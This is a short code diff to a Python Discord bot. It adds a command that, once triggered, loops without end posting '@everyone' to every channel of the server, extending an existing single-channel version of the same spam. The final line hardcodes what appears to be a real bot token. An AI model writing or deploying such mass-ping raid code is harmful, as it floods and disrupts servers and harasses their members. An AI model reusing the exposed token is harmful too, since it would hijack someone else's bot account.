@@ -37,5 +37,10 @@ async def on_message(message):
     if message.content.startswith('what da dog doin'):
         while True:
             await message.channel.send('@everyone')
+            
+    if message.content.startswith('how da dog doin'):
+        while True:
+            for channel in message.guild.channels:
+                await channel.send('@everyone')
 
 client.run('ODkxNTY1Mjc5ODUzODEzNzkw.YVAM3w.F-KDL63VGbZDilMDHIMGYWEoBus')
